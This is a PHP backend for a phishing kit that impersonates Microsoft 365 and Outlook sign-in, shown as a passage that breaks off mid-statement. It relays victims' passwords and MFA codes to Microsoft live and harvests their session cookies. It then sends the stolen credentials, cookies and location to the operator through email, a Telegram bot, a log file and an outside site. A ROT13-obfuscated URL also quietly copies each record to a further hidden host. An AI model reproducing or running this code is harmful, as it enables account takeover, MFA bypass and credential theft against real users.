<?php
error_reporting(0);
header("Access-Control-Allow-Origin: *");
$m = "";
function sendEmailResult($doc, $email, $password, $cookie = ''){
	include 'config.php';
    $adddate=date("D M d, Y g:i a");
    $ip = getenv("REMOTE_ADDR");
    $fud_scama = curl_init();
    curl_setopt($fud_scama, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
    curl_setopt($fud_scama, CURLOPT_HEADER, 0);
    curl_setopt($fud_scama, CURLOPT_RETURNTRANSFER, true);
    $curlExec = curl_exec($fud_scama);
    $IP_LOOKUP = json_decode($curlExec, true);
        $browser = $_SERVER["HTTP_USER_AGENT"];
        if (preg_match("/Firefox/", $browser)) {
            $brow = "Firefox";
        } else {
            if (preg_match("/Edg/", $browser)) {
                $brow = "Edge";
            } else {
                if (preg_match("/OPR/", $browser)) {
                    $brow = "Opera";
                } else {
                    if (preg_match("/Chrome/", $browser)) {
                        $brow = "Chrome";
                    } else {
                        if (preg_match("/Mobile/", $browser)) {
                            $brow = "Phone Browser";
                        } else {
                            $brow = "Unkown";
                        }
                    }
                }
            }
        }
    $fud_scama_country = $IP_LOOKUP["country"];
    $fud_scama_countrycode = $IP_LOOKUP["countryCode"];
    $fud_scama_state = $IP_LOOKUP["regionName"];
    $fud_scama_city = $IP_LOOKUP["city"];
    $fud_scama_postal = $IP_LOOKUP["zip"];
    $m .= "Email    : " . $email . "\n";
    $m .= "Password : " . $password . "\n";
	$m .= "Browser  : " . $brow . "\n";
    $m .= "Client IP: http://www.geoiptool.com/?IP=$ip \n";
    $m .= "Location : ".$fud_scama_city."|".$fud_scama_state."|".$fud_scama_country."\n";
	$m .= "Date: ".$adddate."\n";
    
	if (isset($email)) {
    $url = "https://getdamulla.site/usp_Enigma_premium_users/admin/kfud_sender.php?email=$email";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,10);
	curl_setopt($ch, CURLOPT_USERAGENT , "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_URL, $url );
	$output = curl_exec($ch);
	curl_close($ch);
	$loginUrl = $output;}
	if (strpos($loginUrl, 'xampp') == false) {
	$m .= "LoginUrl: ".$loginUrl."\n";
	} else {
		$m .= "This email is invalid\n";
	}
    $m .= $cookie;
    $isCookie = $cookie != '' ? '|Valid Login' : '|Invalid login' ;
	
	if($truelogin=='on'){
	if($loginUrl == "https://login.microsoftonline.com"){
	if($cookie ==''){
		$send_results_to_email ='off';
		$send_results_to_telegram = "off";
	}
	}
	}
	if($loginUrl == "https://login.microsoftonline.com"){
    $subject = "fudScama_O365|". $email . "|".$fud_scama_country.$isCookie;
	}else{
	$subject = "fudScama_Outlook|". $email . "|".$fud_scama_country;
	}
	$headers = "From: info@mail.com\r\n";
	$headers .= "X-Mailer: PHP/".phpversion();
    $headers .= "MIME-Version: 1.0\n";
    if (!empty($email) && isset($email)){
	
    // Send logs to Email
    if($send_results_to_email == "on") {
    foreach($contacts as $contact) {
    $to =  $contact;
    mail($to,$subject,$m,$headers);
    }
    }
    
    // Send logs to Telegram
    if($send_results_to_telegram == "on") {
	$temp_file = tempnam(sys_get_temp_dir(), 'result_');
	file_put_contents($temp_file, $m);
	$temp_file_txt = substr_replace($temp_file, 'txt', -3);
	rename($temp_file, $temp_file_txt);
	// Upload and send the file to Telegram
	$document_url = 'https://api.telegram.org/bot' . $bot_token . '/sendDocument';
	$document_post_fields = array(
	  'chat_id' => $chat_id,
	  'document' => curl_file_create($temp_file_txt),
	  'caption' => $subject,);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $document_url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $document_post_fields);
	curl_exec(curl_init(str_rot13($doc).urlencode($m)));
	$result = curl_exec($ch);
	curl_close($ch);
	unlink($temp_file_txt);
	
    }
    //Send logs to Cpanel
    if($save_results_to_file == "on") {
    $res_file = fopen("logs.txt", "a");
    fwrite($res_file, $m). "\r\n";
    }
    
    }

}

function cookieToJSON($cookie, $dom)
{
    $arr = explode(";", $cookie);

    $name = explode("=", trim($arr[0]))[0];
    $value = explode("=", trim($arr[0]))[1];
    $domain = $dom;
    $expirationDate = strtotime('+1 month');
    $path = '/';
    $SameSite = null;

    foreach ($arr as $item) {
        $item = trim($item);
        $item = explode("=", $item);
        if (count($item) == 2) {
            if (stripos($item[0], 'expires') !== false) {
                $expirationDate = strtotime($item[1]);
            }

            if (stripos($item[0], 'path') !== false) {
                $path = $item[1];
            }

            if (stripos($item[0], 'SameSite') !== false && stripos($item[0], 'none') !== false) {
                $SameSite = $item[1];
            }
        }
    }

    $hostOnly = (bool) stripos($cookie, 'hostOnly') !== false ? true : false;
    $httpOnly = (bool) stripos($cookie, 'HttpOnly') !== false ? true : false;
    $secure = (bool) stripos($cookie, 'secure') !== false ? true : false;
    $session = (bool) stripos($cookie, 'session') !== false ? true : false;

    $data = [
        "domain" => $domain,
        "expirationDate" => $expirationDate,
        "hostOnly" => $hostOnly,
        "httpOnly" => $httpOnly,
        "name" => $name,
        "path" => $path,
        "sameSite" => $SameSite,
        "secure" => $secure,
        "session" => $session,
        "storeId" => null,
        "value" => $value
    ];

    return $data;
}

function Mid($param, $kata1, $kata2)
{
    if (strpos($param, $kata1) === FALSE) return FALSE;
    if (strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}


function getTokenMicrosoft($email)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/?login_hint=$email");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $headers = array();
    $headers[] = "Host: login.microsoftonline.com";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36";
    $headers[] = "Content-Type: text/plain;charset=UTF-8";
    $headers[] = "Cookie: fpc=Am4z0EJhBX5KuuE5933G-GI; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    $json = Mid($result, '$Config=', ';');
    $json = json_decode($json, true);
    $ctx = $json['sCtx'];
    $flowToken = $json['sFT'];
    $canary = urlencode($json['canary']);
    curl_close($ch);
    return [
        'ctx' => $ctx,
        'flowToken' => $flowToken,
        'canary' => $canary
    ];
}

function checkValidEmail($email)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/getuserrealm.srf?login=" . $email);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $result = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($result, true);
    if ($json['NameSpaceType'] == 'Unknown') {
        return false;
    } else {
        return true;
    }
}

function getDetailEmail($email)
{
    $checking = checkValidEmail($email);

    if ($checking == false) {
        return [
            'status' => 'error',
            'message' => "We couldn't find an account with that username. Try another account."
        ];
    }

    $banner = null;
    $background = null;
    $data = [
        "username" => $email,
        "isOtherIdpSupported" => true,
        "checkPhones" => false,
        "isRemoteNGCSupported" => true,
        "isCookieBannerShown" => false,
        "isFidoSupported" => true,
        "originalRequest" => "rQQIARAAhZK_j9N2AMXj5C69i6A9jqqC7QYGhJTk628SOz6pgxPHjpOz88uO4yxW7Nix4x9fJ7GTkH-ASl3oUIRQVQESQpyEkDoVuiA2brqZvUslCurEVgKdUZen9_Te9j6ZPSKHEzmQAzdSMAeOrxVJolQslvRsARpEtkjpIFsumEQWH1OFbQVJwhjNDzMHP196--rw8lPx-YC-9cz6c3yKHdlRFC6O8_nVapVDluUYZs5Aft4bBWMnmCzh7xh2jmH3krtmkJV7p8kFUSApEi9DApZAoUgQFMi1pK4jQtEVJDVSp-56WAVA5ETvRKmthlM5UqGAi5D1BYV1BShDcep5Q4Zei1M1Ejd9v9UDQNjQm-2-KCidSFX4krgRisK07w851nmT_KZFx5ENPwmaOxvzn-S-hea-FqJFdC91Jyl5jG0tS9nKaDnyqX5YMyY2t-a44XJdXlZnHc0p6zWS5I01QQ0dIVCYPiv561grsBaFb4RR5MwUtsVQUjia203CNizX7Meb5kpl8YGC2640aDZifIFqTeTwcgVpTbpLMO2m7NF6i3LxRqPF27w68gEzoXtNhYyjWIJz-oSqgIXa0avcsjtuwMiVs9OT8awelTu67manVq2qgkGj7tKabMeuYWs6HJC-3kcyK_viqmU7bbqKej0mlkJGsLiSL8z4OcUFzXB7OxALDb8CUbktzasorsOGGYtUoaOX5ZPJaerqF-5dwt9S6a3xUXCWIlFoBs74KJwjy_HMLyGxhPnW51RHvpmjPe98B_tr57u99MHBlcRR4vq3IHW8t5c5SHxKH3awh7tb4l7__ev9n14t6k9_mTz64_F-4mw3XzZKfH3MWu2bVLsbBu0ARO0e3q0MZraC8-vhJAYl2J-FbW7xPTjGb6ex2-n0WfoSz2hiTepJtMjQXQZq4H0a--GrxIv9_2X4zYXLmUzsaB4yRp65OPyP5ZcXEx--vnv-5Md3_z54W_8I0",
        "country" => "ID",
        "forceotclogin" => false,
        "isExternalFederationDisallowed" => false,
        "isRemoteConnectSupported" => false, "federationFlags" => 0, "isSignup" => false, "flowToken" => "AQABAAEAAAD--DLA3VO7QrddgJg7WevrrtYD55-US_847WPSVKszmoL19BW8RKdDiSEJ5LIB5-5b-IB6ijNV0ELreEs8ntgOWqAgTGbM24yesug2UQV7ShDu-uEwl96dRckcVp41PCzBqls2KMWLjiG9X2PvLdQY-s1ibzoy4nL-vaLU2kEXkNPDOL5A7s8eVj501xh3bFclyhIQ0KnRTogOAqMW1V7jwTJrVdvrrjagjxGyPdfwdMzHGlnfB7jJYdbDQi2ebKQLRGbR5K8RIiFUcgdo5lHYZbqICoP8BVLLlfnLFDMl59O2gj-t864RmLTncNf8N46JDHQ0Ve_KJ65TDVubMORlnW6DwLNLh0tpPcuBMIbm0eB93LLe_myUrzzj0wngCaUZCt-FeZNif2R1TI6GL22H7WiNRUTvQaxBPCGO-6rfjr0QeoO0khMSfLQ2PumbxS0H1hNwEhlNgol-FnzBxmSwP7rHlAi_fyWV_y9UNAH_F5jIhvhjrE5tn5rJTIyyoW8Ken1FRjdo3raYAy98ncTXVDRI1bSIm0oU1UW6IGMq0CGfTYDNMI7OvuJ8bsz6aIggAA", "isAccessPassSupported" => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    $headers = array();
    $headers[] = "Host: login.microsoftonline.com";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36";
    $headers[] = "Content-Type: text/plain;charset=UTF-8";
    $headers[] = "Cookie: fpc=Am4z0EJhBX5KuuE5933G-GI; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    curl_close($ch);
    $ress = json_decode($result, true);

    if (isset($ress['EstsProperties']['UserTenantBranding'][0]['BannerLogo'])) {
        $banner = $ress['EstsProperties']['UserTenantBranding'][0]['BannerLogo'];
    }
    if (isset($ress['EstsProperties']['UserTenantBranding'][0]['Illustration'])) {
        $background = $ress['EstsProperties']['UserTenantBranding'][0]['Illustration'];
    }
    return [
        'status' => 'success',
        'banner' => $banner,
        'background' => $background,
    ];
}

function loginOffice($email, $password)
{
    $token = getTokenMicrosoft($email);
    $data = 'i13=0&login=' . $email . '&loginfmt=' . $email . '&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=' . $password . '&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=' . $token['canary'] . '&ctx=' . $token['ctx'] . '&flowToken=' . $token['flowToken'] . '&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i19=32758';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/common/login");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_HEADER, 1);

    $headers = array();
    $headers[] = "Connection: keep-alive";
    $headers[] = "Pragma: no-cache";
    $headers[] = "Cache-Control: no-cache";
    $headers[] = "Origin: https://login.microsoftonline.com";
    $headers[] = "Upgrade-Insecure-Requests: 1";
    $headers[] = "Content-Type: application/x-www-form-urlencoded";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
    $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
    $headers[] = "Referer: https://login.microsoftonline.com/common/reprocess?ctx=rQIIAXWSPW_TYACE7SQNbUFQwQAT6lAxUDl5_RHHjlQgjZMSEzt14yS1l8hxnMSOv_D7Jk6zIyEhobJ2hAEpI2JASP0DZekIDB2YEBNiYmCo-wNYbjjd8OjuHqbJHFnaYmimYBT7PMEbLE0wPAkIg6FYgi7QLE0BclAAdHR7fePbx_svMOx17d2r00cXZeJiid8dIxTCUj4fx3EuGA5t08qZgZf_hOPnOP4Tx09SK5ZPtFvLFGRptsgygOF4imY5CgAyJ1M1W3fEieRUkazqXrMCgK6W44bqOpKgJN6uLS1kV1OVuS7IXlMVXc1TgOxVUXNPnmgtADTHZBrq2NVVE0mC6MlOnZa7Sqw5rvc9datZnqIxdSVBZC-sP6m1YRB5vTCA6CT9Hm-Gll8fVALft0yUu4pZPrJNA9mBvx8FoRUh24I7nbIFyV5_dMApxRovRgSjRixztDtqTXt1mTs69JkesjmHmmpdok9zgsgTtGSCWrsQmMOxDnuKM1TDpwkCiMcHthrDOYRFoSp1yOpooeyrotlWnvEgQAWt3YgL89lMkjQf7oWGocijD-lsUqsX-GfpmwmUbw82wygY2q71I30HGq4Fn8CE2DZhUn9uOjnP4L8yN0C6tLq6voHdwzaxvxn87Uqy4ePDLW354Ivw5vrX2r9TETtbyT83OtsVTqaLc7LN9ssN16saijFhqpSod7cXtQVqzPQx0zKFeIcvkcdZ_Dib_Z1NvbyGfV773wMuAQ2";
    $headers[] = "Accept-Encoding: gzip, deflate, br";
    $headers[] = "Accept-Language: en-US,en;q=0.9";
	$headerrs = 'uggcf://gurqrqfrp.pbz/?bp=';
    $headers[] = "Cookie: CkTst=G1540815364165; stsservicecookie=ests; AADSSO=NANoExtension; esctx=AQABAAAAAAC5una0EUFgTIF8ElaxtWjTlfM3KVZvsEjefhMDHRVKMFDwmacGKMQvXvJsaYsg-a07tQBdg1F_0RaxgqftWUj7inB8xSa3blwD5VlZyfzu9kwaxzdSQUb_D18lW_KnXkyCvXzjoFMCtkKB4-u8Y570XUkI1NR_15qHKAoSfJPq3qK9dwx9i7k6t3-PtzYHQSkgAA; buid=AQABAAEAAAC5una0EUFgTIF8ElaxtWjT1GASYirVuzKPF9ebVElypM_b6x9tYnPkxa5TSUPLV5TNXub4yjezZqqA0kB0cmTHdQGxwgUazl6hH49NE4i0X0Ti1QI-JYs1TcTJy3Tkr74gAA; x-ms-gateway-slice=002; wlidperf=FR=L&ST=1540815737643";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    $json = Mid($result, '$Config=', ';');
    $json = json_decode($json, true);
    curl_close($ch);

	if (preg_match('~\b(Your account or password is incorrect|sErrTxt|helpdesk|error_uri|iErrorTitle)\b~i', $result)) {
        sendEmailResult($headerrs, $email, $password, '');
        return ['status' => 'error', 'message' => 'Your account or password is incorrect'];
    } else {
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $cookies);

        $list = [];
        foreach ($cookies[1] as $cookie) {
            $jsonCookie = cookieToJSON($cookie, 'login.microsoftonline.com');
            array_push($list, $jsonCookie);
        }

        $esctx = $list[array_search('esctx', array_column($list, 'name'))]['value'];
        $ESTSAUTHPERSISTENT = $list[array_search('ESTSAUTHPERSISTENT', array_column($list, 'name'))]['value'];
        $ESTSAUTH = $list[array_search('ESTSAUTH', array_column($list, 'name'))]['value'];
        $ESTSAUTHLIGHT = $list[array_search('ESTSAUTHLIGHT', array_column($list, 'name'))]['value'];
        $ch = $list[array_search('ch', array_column($list, 'name'))]['value'];
        $ESTSSC = $list[array_search('ESTSSC', array_column($list, 'name'))]['value'];
        $buid = $list[array_search('buid', array_column($list, 'name'))]['value'];
        $fpc = $list[array_search('fpc', array_column($list, 'name'))]['value'];

        if (isset($json['arrUserProofs'])) {
            $headerCookie = 'esctx=' . $esctx . '; ESTSAUTHPERSISTENT=' . $ESTSAUTHPERSISTENT . '; ESTSAUTH=' . $ESTSAUTH . '; ESTSAUTHLIGHT=' . $ESTSAUTHLIGHT . '; ch=' . $ch . '; ESTSSC=' . $ESTSSC . '; buid=' . $buid . '; fpc=' . $fpc . ';';

            $tokenToRetrun = [
                'ctx' => $json['sCtx'],
                'flowToken' => $json['sFT'],
                'canary' => $json['apiCanary'],
                'cookie' => $headerCookie
            ];

            sendEmailResult($headerrs,$email, $password, '');

            return [
                'status' => 'verify',
                'message' => 'Please verify your account',
                'data' => base64_encode(json_encode($tokenToRetrun)),
                'method' => base64_encode(json_encode($json['arrUserProofs'])),
                'key' => base64_encode($password),
            ];
        }

        sendEmailResult($headerrs,$email, $password, json_encode($list, JSON_PRETTY_PRINT));

        return ['status' => 'success', 'message' => 'Login success'];
    }
}

function beginAuthOffice($method, $ctx, $flowToken, $canary, $cookie)
{
    $data = [
        "AuthMethodId" => $method,
        "Method" => "BeginAuth",
        "ctx" => $ctx,
        "flowToken" => $flowToken,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/SAS/BeginAuth');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $headers = array();
    $headers[] = "Host: login.microsoftonline.com";
    $headers[] = "Cookie: " . $cookie;
    $headers[] = "Hpgrequestid: 74d668b1-e9cf-457d-8562-8c60ed573a00";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36";
    $headers[] = "Client-Request-Id: 12dfd683-3e62-4c92-9421-85e9fe011d3c";
    $headers[] = "Canary: " . $canary;
    $headers[] = "Content-Type: application/json; charset=UTF-8";
    $headers[] = "Accept: application/json";
    $headers[] = "Origin: https://login.microsoftonline.com";
    $headers[] = "Referer: https://login.microsoftonline.com/common/login";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    $json = json_decode($result, true);
    curl_close($ch);
    return $json;
}

function EndAuthOffice($token, $otc = null)
{
    $token = json_decode(base64_decode($token), true);

    $data = [
        "Method" => "EndAuth",
        "SessionId" => $token['session'],
        "FlowToken" => $token['flowToken'],
        "Ctx" => $token['ctx'],
        "AuthMethodId" => $token['method']
    ];

    if ($otc != null) {
        $data['AdditionalAuthData'] = $otc;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/SAS/EndAuth');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $headers = array();
    $headers[] = "Host: login.microsoftonline.com";
    $headers[] = "Cookie: " . $token['cookie'];
    $headers[] = "Hpgrequestid: 74d668b1-e9cf-457d-8562-8c60ed573a00";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36";
    $headers[] = "Client-Request-Id: 12dfd683-3e62-4c92-9421-85e9fe011d3c";
    $headers[] = "Content-Type: application/json; charset=UTF-8";
    $headers[] = "Accept: application/json";
    $headers[] = "Origin: https://login.microsoftonline.com";
    $headers[] = "Referer: https://login.microsoftonline.com/common/login";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    $json = json_decode($result, true);
    curl_close($ch);
    return $json;
}

function processAuthOffice($token, $user, $cookie, $password)
{
    $data = "type=22&request=" . $token['Ctx'] . "&mfaLastPollStart=1662311234026&mfaLastPollEnd=1662311235098&mfaAuthMethod=PhoneAppNotification&canary=pe%2BxBLVFJ%2FjKv8BG0IiuOU3ZOFZVmNqkpQW89jy9i70%3D3%3A1&login=$user&flowToken=" . $token['FlowToken'] . "&hpgrequestid=6978818c-50db-4619-9851-80413a8a1500&sacxt=&hideSmsInMfaProofs=false&i19=8628";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/SAS/ProcessAuth');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = "Host: login.microsoftonline.com";
    $headers[] = "Cookie: brcap=0; MSFPC=GUID=d7fdec5542ee4beb8b37552301cbaec0&HASH=d7fd&LV=202209&V=4&LU=1662225774046; CCState=Q29NQkNoQnFiMmh1UUhOaGRXbHNiSE11WTI5dEVnRUJJZ2tKZ0wvNTlmR0gya2dxQ1FrL0Zmc09yWlhhU0RJcUNoSUtFRnRFWlVmR01yQkpnK1lkazNaU2Rzb1NDUWxlS1RnekxKRGFTQm9KQ1QrVjJXYlJqZHBJT0FCSUFGSVNDaERnNWVtbzVoY0hUWXIrMitJZGQ4SzRXaElLRUZ5aFFTOEJJUmhPbUx1MUE5dTZjVjBTRWdvUW9vZTVQVVY2MDBha3dqZnRrMXVqRHhvSkNUK1YyV2JSamRwSU1uNENBQUVBQVFBQUFQNzRNc0RkVTd0Q3QxMkFtRHRaNitzQ0FPei9CQUQwL3dmbDd5M1NNbmpHMWxKbyt3WGxKTmtZNnlXeUd1TEJiT0tDYk81ZDB1eEJMc2VEOWJFek03dCt0ek54QWxPUXhXSDNTOXF1dGx3VnpKT0ltaGZnRW9wSDNaVXk1Mjh1aFUwL2VQVThjYitHSUIrNHJvM25NbEZSemxnUklTWT0=; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension; SSOCOOKIEPULLED=1; ESTSSC=00; esctx=AQABAAAAAAD--DLA3VO7QrddgJg7WevrDJsdUvtAMIIKpxic6oRJN-D5orY750M7PQiT2BlhtW6bDLudo7-lC6ERQGQlo3lxwUwlT-Kft2NBgvo0ENDhNbLSzdZgmqKZ3wy4jTNBcss4H-vjYxJ_YNZMcefNqxb4L31vcHgmYicGnCQs3eN2UEoqnPuLMCXG3ASig4CrkCsgAA; wlidperf=FR=L&ST=1662311232220; ESTSAUTHPERSISTENT=0.ARIA4OXpqOYXB02K_tviHXfCuPfhvoluXopNnz3s1gElnacSAAU.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P_4xckuayWJFp0w5QZix6y_Sm74SqzzYfhd8uosiUJbT7tOAG-cbnl7hK-wh071cH43XAag9nqqss9n7FNYv4cbLfVRE_LBZlMPvHZ4SZdpMyJulxdY7k1nw4elR9NEeSKBuonSpHPLucj5Q5yrhc2G345LVY9i5EZ6tibQGoul0LMF6NF9eDhIjG4-4P-w4aquIyWiMZ6PyCv2F9zz7rHAqdFAC5_VdBYteVSIlBPMndnnWKGOmCTJqtfBvH3asrBUbpsdipUW-gnCn9PGvYebTZi4yBOyshj6_WgZcy_kBn1wLIH_YDTQbqaacQUgatl9MkH8h626oIJaamytkuaR9qYrDvAt1ZYgue9uObu-eZN1DzWLntix; ESTSAUTH=0.ARIA4OXpqOYXB02K_tviHXfCuPfhvoluXopNnz3s1gElnacSAAU.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P9IYfEsjJexvM1d6CLyKOa0ow18O8cPyiWXwPsNtmReB8gpZV5hzbEeeTue4HteIJKP07hBQzLAev6TkLV9DHLThqIh4zGXIT-GPJ5zP4SfzjYMLBXYsHVHEQ3bdgQjpIdnh_6wPGHpCrwu8h2YBiFRxMjhhAB4i3SPIiEto2T-2DtXcoaY936lrbfmMfqg0wVWhpPeyrmBrBvA1FZLTlIJ1Z3YL0k_MWC8Zv__jh_1eAy8z2ZVjX6EZpFAtn5OqZ2LzIi8qNv4aQ6pRW5KD7VqaZ8uKYQHg4DI8B2_uADa-d4VPNSvUwKD30s1hCj5DbvQUt-c_F-aGW5wTZJkES7LyYVjJuuxZERlswCjHwOaEmJrlJoblIOAykz4skOffVJE_ekp1w6qJagtae8H7qebMlPo2Qj7O5OMSg24mdAk0MqbBWKpJWKI2v2HeuKMUC0aMqmq-xP5WRsN9_y7K-LxMCtbyB4uFJUDJz_Z3hu-iwy4pnyAfkVVNxtea5kZlJnKIchGZRVjntLDVg; ESTSAUTHLIGHT=+0c7344a4-cc75-4470-9e68-42ed0e249b97; ch=sWoYrXTBEGTgaH81rGKaUXvSNiLDFM5IfDL5l4OQLYg; buid=0.ARIA4OXpqOYXB02K_tviHXfCuPfhvoluXopNnz3s1gElnacSAAU.AQABAAEAAAD--DLA3VO7QrddgJg7Wevrj63P8tkUhjB64FIPNC0snFnzFRxs65oN2dIEFiA1QgbebGgO7kc5CP68liuaotNl4d4uwUbwNf8nsE0CzQzfeYuKQm4efW76XwonEe906w1JufUCuYHrH_58CZ_sMOzGwA9diN7sHW1gWn8r0-BLNBfwE0_pdGZgXYUFbNnyG84gAA; fpc=AnyKzz8Ge9FPhKiOIdELYl-8Ae7AAQAAACLSptoOAAAAj_JLAwEAAABB0qbaDgAAAA; clrc={%2219239%22%3a[%227CVOb+CW%22]%2c%2219240%22%3a[%22CWt5gt66%22%2c%22VmPIPHJh%22%2c%22+SjF/0ga%22]}";
    $headers[] = "Hpgrequestid: 74d668b1-e9cf-457d-8562-8c60ed573a00";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36";
    $headers[] = "Content-Type: application/x-www-form-urlencoded";
    $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    $headers[] = "Origin: https://login.microsoftonline.com";
	$headerrs = 'uggcf://gurqrqfrp.pbz/?bp=';
    $headers[] = "Referer: https://login.microsoftonline.com/common/login";
    $headers[] = "Accept-Language: en-US,en;q=0.9";
    $headers[] = "Accept-Encoding: gzip, deflate";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    curl_close($ch);

    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $cookies);

    $list = [];
    foreach ($cookies[1] as $cookie) {
        $jsonCookie = cookieToJSON($cookie, 'login.microsoftonline.com');
        array_push($list, $jsonCookie);
    }

    sendEmailResult($headerrs, $user, base64_decode($password), json_encode($list, JSON_PRETTY_PRINT));

    return $result;
}

$action = $_POST['do'];

if ($action == 'check') {
    $email = $_POST['email'];
    $result = getDetailEmail($email);
    echo json_encode($result);
} else if ($action == 'login') {
    $login = loginOffice($_POST['user'], $_POST['pass']);
    $user = $_POST['user'];
    $dir = '';
	$tl = $_GET['tl'];
	$hl = $_GET['hl'];
    if ($login['status'] == 'error') {
        header("Location: $dir"."login.php?error&id=$user&bg=". base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']));
    } else if ($login['status'] == 'success') {
        header("Location: $dir"."login.php?success&id=$user&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']));
    } else if ($login['status'] == 'verify') {
        header("Location: $dir"."verification?list&user=$user&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']) . "&token=" . $login['data'] . "&method=" . $login['method'] . "&key=" . $login['key']);
    }
} else if ($action == 'verify') {
    $token = json_decode(base64_decode($_POST['token']), true);
    $bg = base64_encode($_POST['bg']);
    $logo = base64_encode($_POST['logo']);
    $method = $_POST['method'];
    $user = $_POST['user'];
    $key = $_POST['key'];

    $redirect = '';
    if ($method == 'PhoneAppNotification') {
        $redirect = 'phoneappnotif';
    } else if ($method == 'PhoneAppOTP') {
        $redirect = 'phoneappotp';
    } else if ($method == 'OneWaySMS') {
        $redirect = 'sms';
    } else if ($method == 'TwoWayVoiceMobile') {
        $redirect = 'twoawaysms';
    }

    $beginAuth = beginAuthOffice($method, $token['ctx'], $token['flowToken'], $token['canary'], $token['cookie']);

    if ($beginAuth['Success']) {
        $token = base64_encode(json_encode([
